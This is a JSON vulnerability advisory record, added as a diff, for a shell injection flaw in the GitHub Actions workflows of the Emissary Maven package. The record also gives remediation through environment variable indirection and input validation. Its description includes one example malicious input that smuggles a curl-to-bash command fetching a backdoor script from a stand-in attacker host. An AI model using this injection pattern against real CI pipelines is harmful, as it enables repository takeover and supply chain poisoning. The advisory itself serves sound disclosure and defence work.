@@ -1,0 +1,59 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-04-08T00:12:43Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "gov.nsa.emissary:emissary"
+  },
+  "Advisory": {
+    "DatabaseId": 347609,
+    "Id": "GSA_kwCzR0hTQS0zZzZnLWdxNHIteGptOc4ABU3Z",
+    "GhsaId": "GHSA-3g6g-gq4r-xjm9",
+    "References": [
+      {
+        "Url": "https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-3g6g-gq4r-xjm9"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35580"
+      },
+      {
+        "Url": "https://github.com/NationalSecurityAgency/emissary/pull/1286"
+      },
+      {
+        "Url": "https://github.com/NationalSecurityAgency/emissary/pull/1288"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-3g6g-gq4r-xjm9"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-3g6g-gq4r-xjm9"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-35580"
+      }
+    ],
+    "Description": "## Summary\n\nThree GitHub Actions workflow files contained **10 shell injection points** where\nuser-controlled `workflow_dispatch` inputs were interpolated directly into shell\ncommands via `${{ }}` expression syntax. An attacker with repository write access\ncould inject arbitrary shell commands, leading to repository poisoning and supply\nchain compromise affecting all downstream users.\n\n## Affected Files\n\n| Workflow file                            | Injection points |\n|------------------------------------------|------------------|\n| `.github/workflows/maven-version.yml`    | 4                |\n| `.github/workflows/cherrypick.yml`       | 5                |\n| `.github/workflows/maven-release.yml`    | 1                |\n\n## Details\n\nGitHub Actions `${{ }}` expressions inside `run:` blocks are substituted **before**\nthe shell interprets the command. When a `workflow_dispatch` input is placed directly\nin a `run:` block, an attacker who can trigger the workflow can break out of the\nintended command and execute arbitrary code.\n\n### Example — `maven-version.yml` (before fix)\n\n```yaml\n- name: Set the name of the branch\n  run: echo \"PR_BRANCH=action/${{ github.event.inputs.next_version }}\" \u003e\u003e \"$GITHUB_ENV\"\n```\n\nA malicious input such as `1.0.0\"; curl attacker.com/backdoor.sh | bash; echo \"`\nwould be interpolated directly into the shell, executing arbitrary commands with\nthe job's `GITHUB_TOKEN` permissions (`contents: write`, `pull-requests: write`).\n\n### Impact\n\n- Arbitrary code execution within the CI/CD runner\n- Repository modification via the `contents: write` token (push malicious commits)\n- Supply chain poisoning — downstream users who clone or build receive compromised code\n- Credential exfiltration from the GitHub Actions environment\n\n## Remediation\n\nFixed in two PRs merged into release 8.39.0:\n\n### PR #1286 — Environment variable indirection\n\nReplaced all direct `${{ inputs.* }}` interpolation in `run:` blocks with\nenvironment variable indirection. Inputs are assigned to `env:` at the step level,\nthen referenced as shell variables inside `run:`.\n\n```yaml\n# After (safe — input is never interpreted by the shell parser)\n- name: Set the name of the branch\n  run: echo \"PR_BRANCH=action/$IN_NEXT_VERSION\" \u003e\u003e \"$GITHUB_ENV\"\n  env:\n    IN_NEXT_VERSION: ${{ github.event.inputs.next_version }}\n```\n\n### PR #1288 — Input validation\n\nAdded strict regex validation steps that run before any input is used:\n\n- `maven-version.yml`: Validates `next_version` matches `^[a-zA-Z0-9._-]+$`\n- `maven-release.yml`: Validates `release_suffix` matches `^[a-zA-Z0-9._-]+$`\n- `cherrypick.yml`: Validates `commits` matches `^([0-9a-f]{7,40})(\\s+[0-9a-f]{7,40})*$`\n\nAll jobs now also use `shell: bash` via `defaults.run.shell` to ensure consistent\nshell behavior.\n\n## Workarounds\n\nThere is no workaround other than upgrading. Organizations that have forked\nEmissary should apply the same environment variable indirection and input\nvalidation patterns to their workflow files.\n\n## References\n\n- [PR #1286 — environment variable indirection](https://github.com/NationalSecurityAgency/emissary/pull/1286)\n- [PR #1288 — input validation](https://github.com/NationalSecurityAgency/emissary/pull/1288)\n- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/resources/github-actions-untrusted-input/)\n- Original report: GHSA-wjqm-p579-x3ww",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-08T00:12:42Z",
+    "Severity": "CRITICAL",
+    "Summary": "Emissary has GitHub Actions Shell Injection via Workflow Inputs",
+    "UpdatedAt": "2026-04-08T00:12:43Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "8.39.0"
+      },
+      "VulnerableVersionRange": "\u003c 8.39.0"
+    }
+  ]
+}
